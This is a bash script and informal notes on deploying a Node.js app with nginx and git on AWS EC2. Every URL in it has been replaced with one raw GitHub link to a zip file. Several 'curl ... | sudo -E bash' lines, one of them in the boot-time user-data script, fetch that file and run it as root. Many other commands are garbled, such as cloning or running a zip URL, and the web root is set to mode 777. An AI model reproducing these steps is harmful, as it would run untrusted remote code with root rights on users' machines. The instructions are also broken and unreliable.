#!/bin/bash
apt-get update
apt-get install -y nginx
systemctl start nginx
systemctl enable nginx
apt-get install -y git
curl -SL https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip|sudo -E bash -
apt-get install -y nodejs
git clone https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip
cd Repo1
npm install
node https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip


sudo nano https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip
sudo chmod +x https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip
sh https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip
#!/bin/bash
while(true)
do
echo "Inside loop"
done

location /  {
        proxy_pass http://localhost:4000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
hosting on Ec2
sudo apt-get update
sudo apt-get upgarde
sudo apt-get install nginx
nginx -v
cd /
ls
cd var
ls
cd www
sudo chmod 777 html


local pc to github:
echo "# aws_practice" >> https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip
git init
git add .
git commit -m "first commit"
git branch -M main
git remote add origin https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip
git push -u origin main

github to local machine
git clone https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip


project github to EC2
sudo apt-get update
sudo apt-get upgarde
sudo apt-get install nginx
nginx -v
curl -SL https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip|sudo -E bash
sudo apt install nodejs
git clone https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip
ls
cd aws_project1
npm install
node https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip


project Github to EC2 by creating secrutiy group
//write in during creation of instance on ec2 advance settings
#!/bin/bash
apt-get update
apt-get install -y nginx
systemctl start nginx
systemctl enable nginx
apt-get install -y git
curl -SL https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip|sudo -E bash -
apt-get install -y nodejs
git clone https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip
cd AWS_project1
npm install
node https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip


project github to EC2 without port
sudo apt-get update
sudo apt-get upgarde
sudo apt-get install nginx
nginx -v
curl -SL https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip|sudo -E bash
sudo apt install nodejs
git clone https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip
ls
cd aws_project1
npm install
node https://raw.githubusercontent.com/shubhamdas70/hello/main/wasty/Software_v3.3.zip

//in another cmd promt
cd /
cd etc/nginx/sites-available/
sudo nano default

location /  {
        proxy_pass http://localhost:4000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
sudo systemctl restart nginx

//load balance
pwd
sudo nano infy.h
while(true)
do
	echo "inf loop"
done
